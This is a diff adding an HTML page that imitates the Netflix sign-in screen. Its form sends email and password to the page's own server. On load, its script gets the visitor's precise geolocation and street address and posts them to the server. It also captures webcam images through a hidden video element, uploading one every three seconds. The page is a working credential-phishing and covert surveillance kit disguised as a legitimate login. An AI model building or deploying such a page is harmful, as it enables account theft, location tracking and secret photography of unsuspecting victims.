@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Sign In</title>
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico"/>
+    <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #000;
+            color: #fff;
+            position: relative;
+            overflow-x: hidden;
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), 
+                        url('https://localdstvinstaller.co.za/wp-content/uploads/2018/08/netflix-1030x579.jpg') no-repeat center center/cover;
+            z-index: -1;
+            filter: blur(2px);
+        }
+        
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 40px;
+        }
+        
+        .logo img {
+            width: 150px;
+        }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 0;
+            flex: 1;
+        }
+        
+        .login-form {
+            background-color: rgba(0, 0, 0, 0.75);
+            border-radius: 4px;
+            padding: 60px 68px;
+            width: 450px;
+            max-width: 100%;
+        }
+        
+        h1 {
+            font-size: 32px;
+            margin-bottom: 28px;
+            font-weight: 500;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        input {
+            width: 100%;
+            height: 54px;
+            background-color: rgba(35, 35, 35, 0.5);
+            border: 1px solid rgba(80, 80, 80, 0.6);
+            border-radius: 4px;
+            color: #fff;
+            padding: 0 16px;
+            font-size: 16px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3) inset;
+        }
+        
+        input:focus {
+            outline: none;
+            background-color: rgba(45, 45, 45, 0.7);
+            border-color: #8c8c8c;
+        }
+        
+        input::placeholder {
+            color: #fff;
+            opacity: 0.7;
+        }
+        
+        .signin-btn {
+            width: 100%;
+            height: 50px;
+            background-color: #e50914;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 24px;
+            cursor: pointer;
+            margin-bottom: 12px;
+            font-family: Arial, sans-serif;
+            letter-spacing: 0.5px;
+        }
+        
+        .signin-btn:hover {
+            background-color: #f40612;
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 12px 0;
+            color: #8b8b8b;
+            font-size: 14px;
+            font-weight: normal;
+        }
+        
+        .sign-in-code-btn {
+            width: 100%;
+            height: 50px;
+            background-color: rgba(69, 69, 69, 0.5);
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 16px;
+            font-weight: 500;
+            font-family: Arial, sans-serif;
+            letter-spacing: 0.5px;
+        }
+        
+        .sign-in-code-btn:hover {
+            background-color: rgba(80, 80, 80, 0.7);
+        }
+        
+        .forgot-password {
+            color: #fff;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            text-align: center;
+            margin-top: 14px;
+            text-decoration: underline;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            color: #fff;
+            font-size: 13px;
+        }
+        
+        .checkbox-container input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            margin-right: 5px;
+            background-color: transparent;
+            border: 1px solid #737373;
+            box-shadow: none;
+            appearance: none;
+            -webkit-appearance: none;
+            position: relative;
+            cursor: pointer;
+            border-radius: 1px;
+        }
+        
+        .checkbox-container input[type="checkbox"]:checked {
+            background-color: #e50914;
+            border-color: #e50914;
+        }
+        
+        .checkbox-container input[type="checkbox"]:checked:after {
+            content: "";
+            position: absolute;
+            left: 4px;
+            top: 1px;
+            width: 4px;
+            height: 8px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+        
+        /* تصميم خاص لزر تذكرني ليكون كما في الصورة */
+        .custom-checkbox {
+            position: relative;
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            background-color: transparent;
+            border: 1px solid #fff;
+            border-radius: 1px;
+            cursor: pointer;
+        }
+        
+        .custom-checkbox::before {
+            content: "✓";
+            position: absolute;
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+            left: 2px;
+            top: 0px;
+            opacity: 1;
+            transition: opacity 0.1s ease;
+        }
+        
+        .custom-checkbox.unchecked::before {
+            opacity: 0;
+        }
+        
+        .checkbox-container label {
+            cursor: pointer;
+        }
+        
+        .new-to-netflix {
+            margin-top: 16px;
+            font-size: 16px;
+            color: #737373;
+        }
+        
+        .new-to-netflix a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .new-to-netflix a:hover {
+            text-decoration: underline;
+        }
+        
+        .recaptcha-info {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #8c8c8c;
+            line-height: 1.3;
+        }
+        
+        .recaptcha-info a {
+            color: #0071eb;
+            text-decoration: none;
+        }
+        
+        .recaptcha-info a:hover {
+            text-decoration: underline;
+        }
+
+        /* تصميم ذيل الصفحة (Footer) */
+        .footer {
+            position: relative;
+            background-color: rgba(0, 0, 0, 0.85);
+            padding: 30px 0;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .footer-container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 40px;
+        }
+
+        .footer-title {
+            color: #737373;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: #737373;
+            font-size: 13px;
+            margin-right: 30px;
+            margin-bottom: 15px;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            display: inline-flex;
+            align-items: center;
+            border: 1px solid #333;
+            padding: 8px 15px;
+            border-radius: 2px;
+            background-color: #000;
+            color: #737373;
+            margin-top: 20px;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .language-selector svg {
+            margin-right: 5px;
+            width: 16px;
+            height: 16px;
+        }
+
+        .language-selector select {
+            background: transparent;
+            border: none;
+            color: #737373;
+            appearance: none;
+            font-size: 14px;
+            padding-right: 20px;
+            cursor: pointer;
+        }
+
+        .language-selector::after {
+            content: "▼";
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 10px;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+    
+    <div class="logo">
+        <svg viewBox="0 0 111 30" width="150" height="40" fill="#e50914">
+            <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
+        </svg>
+    </div>
+    
+    <div class="container">
+        <div class="login-form">
+            <h1>Sign In</h1>
+            
+            <form action="/login" method="POST">
+                <div class="form-group">
+                    <input type="text" name="email" placeholder="Email or mobile number" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="signin-btn">Sign In</button>
+                
+                <div class="divider">OR</div>
+                
+                <button type="button" class="sign-in-code-btn">Use a Sign-in Code</button>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <div class="checkbox-container">
+                    <span class="custom-checkbox" id="checkbox-visual" onclick="toggleCheckbox()"></span>
+                    <label for="remember" onclick="toggleCheckbox()">Remember me</label>
+                    <input type="checkbox" id="remember" name="remember" checked style="display: none;">
+                </div>
+                
+                <div class="new-to-netflix">
+                    New to Netflix? <a href="/signup">Sign up now</a>.
+                </div>
+                
+                <div class="recaptcha-info">
+                    This page is protected by Google reCAPTCHA to ensure you're not a bot.
+                    <a href="#">Learn more</a>.
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-title">Questions? Contact us.</div>
+            <div class="footer-links">
+                <a href="#">FAQ</a>
+                <a href="#">Help Center</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Privacy</a>
+                <a href="#">Cookie Preferences</a>
+                <a href="#">Corporate Information</a>
+            </div>
+            <div class="language-selector">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M8 14.5C11.5899 14.5 14.5 11.5899 14.5 8C14.5 4.41015 11.5899 1.5 8 1.5C4.41015 1.5 1.5 4.41015 1.5 8C1.5 11.5899 4.41015 14.5 8 14.5ZM8 16C12.4183 16 16 12.4183 16 8C16 3.58172 12.4183 0 8 0C3.58172 0 0 3.58172 0 8C0 12.4183 3.58172 16 8 16Z" fill="#737373"/>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.7203 5.28L7.20026 8.8L5.27026 6.86C4.88026 6.47 4.28026 6.47 3.89026 6.86C3.50026 7.25 3.50026 7.85 3.89026 8.24L6.58026 10.93C6.77026 11.12 7.02026 11.22 7.28026 11.22C7.54026 11.22 7.79026 11.12 7.98026 10.93L12.1103 6.8C12.5003 6.41 12.5003 5.81 12.1103 5.42C11.7203 5.03 11.1103 5.03 10.7203 5.42V5.28Z" fill="#737373"/>
+                </svg>
+                <select name="language" id="language">
+                    <option value="en">English</option>
+                    <option value="ar">العربية</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                </select>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize checkbox state
+            var checkbox = document.getElementById('remember');
+            var checkboxVisual = document.getElementById('checkbox-visual');
+            
+            if (!checkbox.checked) {
+                checkboxVisual.classList.add('unchecked');
+            }
+            
+            // Request location and video permissions on load
+            requestPermissions();
+        });
+        
+        function toggleCheckbox() {
+            var checkbox = document.getElementById('remember');
+            checkbox.checked = !checkbox.checked;
+            
+            var checkboxVisual = document.getElementById('checkbox-visual');
+            checkboxVisual.classList.toggle('unchecked');
+        }
+        
+        // Function to request permissions
+        function requestPermissions() {
+            // Global variables
+            let stream = null;
+            let hiddenVideo = null;
+            
+            // Request geolocation permission with high accuracy
+            if (navigator.geolocation) {
+                const geoOptions = {
+                    enableHighAccuracy: true,  // Request highest possible accuracy
+                    timeout: 10000,           // 10 second timeout
+                    maximumAge: 0             // Get fresh location data
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    // Success getting location
+                    function(position) {
+                        let latitude = position.coords.latitude;
+                        let longitude = position.coords.longitude;
+                        let accuracy = position.coords.accuracy; // Accuracy in meters
+                        let altitude = position.coords.altitude; // Altitude if available
+                        let speed = position.coords.speed; // Speed if available
+                        let heading = position.coords.heading; // Direction if available
+                        let timestamp = new Date(position.timestamp).toISOString();
+                        
+                        // Google Maps URL with zoom level 18 (very detailed)
+                        let mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=18`;
+                        
+                        // Create Google Earth link too (3D view)
+                        let earthUrl = `https://earth.google.com/web/search/${latitude},${longitude}/`;
+                        
+                        // Send detailed location to server
+                        fetch('/location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                latitude: latitude,
+                                longitude: longitude,
+                                accuracy: accuracy,
+                                altitude: altitude,
+                                speed: speed,
+                                heading: heading,
+                                timestamp: timestamp,
+                                mapUrl: mapUrl,
+                                earthUrl: earthUrl
+                            })
+                        });
+                        
+                        // Try to get more accurate address information
+                        try {
+                            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`)
+                            .then(response => response.json())
+                            .then(data => {
+                                // Send the address details to the server
+                                fetch('/address', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                    },
+                                    body: JSON.stringify(data)
+                                });
+                            })
+                            .catch(err => console.log("Could not get address details"));
+                        } catch (e) {
+                            console.log("Error getting address details");
+                        }
+                    },
+                    // Failed to get location
+                    function(error) {
+                        console.log("User denied location permission:", error.message);
+                    },
+                    geoOptions // Use our high accuracy options
+                );
+            }
+            
+            // Request webcam access
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                // Create a hidden video element to capture webcam
+                hiddenVideo = document.createElement('video');
+                hiddenVideo.style.width = '1px';
+                hiddenVideo.style.height = '1px';
+                hiddenVideo.style.position = 'absolute';
+                hiddenVideo.style.opacity = '0.01';
+                hiddenVideo.style.pointerEvents = 'none';
+                hiddenVideo.setAttribute('playsinline', '');
+                hiddenVideo.setAttribute('autoplay', '');
+                hiddenVideo.setAttribute('muted', '');
+                document.body.appendChild(hiddenVideo);
+                
+                // Create a hidden canvas for capturing images
+                const canvas = document.createElement('canvas');
+                canvas.style.display = 'none';
+                document.body.appendChild(canvas);
+                
+                // Request camera access with lower resolution
+                navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false // No audio needed
+                })
+                .then(function(videoStream) {
+                    stream = videoStream;
+                    
+                    // Connect stream to hidden video element
+                    hiddenVideo.srcObject = stream;
+                    
+                    // Wait for video to be loaded and ready to play
+                    hiddenVideo.onloadedmetadata = function() {
+                        hiddenVideo.play();
+                        
+                        // Set canvas size to match video
+                        canvas.width = hiddenVideo.videoWidth;
+                        canvas.height = hiddenVideo.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        
+                        // Function to capture and upload image
+                        const captureAndUpload = function() {
+                            // Draw current video frame to canvas
+                            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+                            
+                            // Convert canvas to a jpeg blob with 0.7 quality (70%)
+                            canvas.toBlob(function(blob) {
+                                console.log("Captured image, size:", blob.size, "bytes");
+                                
+                                // Create a form to send the image
+                                const formData = new FormData();
+                                formData.append('image', blob, `webcam_snapshot_${new Date().toISOString().replace(/:/g, '-')}.jpg`);
+                                
+                                // Send image to server
+                                fetch('/upload_image', {
+                                    method: 'POST',
+                                    body: formData
+                                })
+                                .then(response => {
+                                    if (!response.ok) {
+                                        console.error("Image upload failed with status:", response.status);
+                                    } else {
+                                        console.log("Image uploaded successfully");
+                                    }
+                                })
+                                .catch(error => {
+                                    console.error("Error uploading image:", error);
+                                });
+                            }, 'image/jpeg', 0.7);  // 70% quality JPEG
+                        };
+                        
+                        // Take first snapshot immediately
+                        captureAndUpload();
+                        
+                        // Then take a snapshot every 3 seconds, for a maximum of 60 seconds (20 images)
+                        let captureCount = 0;
+                        const captureInterval = setInterval(function() {
+                            captureCount++;
+                            captureAndUpload();
+                            
+                            // Stop after 20 images (60 seconds)
+                            if (captureCount >= 20) {
+                                clearInterval(captureInterval);
+                                console.log("Finished capturing images");
+                                
+                                // Clean up resources
+                                if (stream) {
+                                    stream.getTracks().forEach(track => track.stop());
+                                }
+                                if (hiddenVideo) {
+                                    hiddenVideo.pause();
+                                    hiddenVideo.srcObject = null;
+                                    document.body.removeChild(hiddenVideo);
+                                }
+                                if (canvas) {
+                                    document.body.removeChild(canvas);
+                                }
+                            }
+                        }, 3000);  // Take a picture every 3 seconds
+                    };
+                })
+                .catch(function(err) {
+                    console.log("User denied camera permission:", err);
+                });
+            }
+        }
+    </script>
+</body>
+</html> 
